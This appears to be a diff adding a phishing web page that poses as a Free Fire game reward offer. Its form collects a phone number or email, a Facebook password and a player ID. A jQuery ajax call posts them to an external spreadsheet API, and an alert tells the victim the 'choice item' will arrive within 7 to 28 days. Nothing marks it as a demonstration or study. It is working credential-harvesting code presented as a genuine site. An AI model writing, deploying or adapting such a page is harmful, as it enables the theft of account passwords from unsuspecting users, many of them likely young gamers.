@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Enter Your Details</title>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+  <script src="alert.js"></script>
+<script
+  src="https://code.jquery.com/jquery-3.4.1.js"
+  integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+  crossorigin="anonymous"></script>
+<script>
+function SubForm (){
+    $.ajax({
+        url:'https://api.apispreadsheets.com/data/rTpnPaIVOs4vjJfb/',
+        type:'post',
+        data:$("#myForm").serializeArray(),
+        success: function(){
+          alert("Crangulations, loggin successful you recieve your choice item soon. It may take 7 days or sometimes it take 28 days. thanks for choosing our site ")
+        },
+        error: function(){
+          alert("There was an error try again")
+        }
+    });
+}
+function notice(){
+  alert("Notice- make sure phone number and password are correct and a facebook id. If your input information is wrong or blank you can't able for these reward Thanks for choosing our site");
+}
+</script>
+<link rel="stylesheet" href="style.css">
+  <form id="myForm">
+    <input type="text" placeholder="Phone or email" name="email&number" id="phone">
+    <br>
+    <input type="text" placeholder="Password" name="Password" id="pass">
+    <br>
+    <input type="number" placeholder="Enter player id" name="Player_id" id="player_id">
+    <br>
+  </form>
+  <button class="submit" onclick="SubForm()">Submit</button>
+    <img  class="logo" src="https://wallpapers.com/images/thumbnail/free-fire-logo-armed-woman-fdsbmr41d528ty45.webp" alt="">
+    <p class="sure">Note-</p>
+    <p class="sure">Make sure Id and Password are correct</p>
+    <h5 class="sendf">Send us Feedback -</5>
+    <a class="feedback" href="feedback.html">Feedback</a>
+        <h4>After fill the form read this notice -</h4>
+    <button class="notice"onclick="notice();">NOTICE</button>
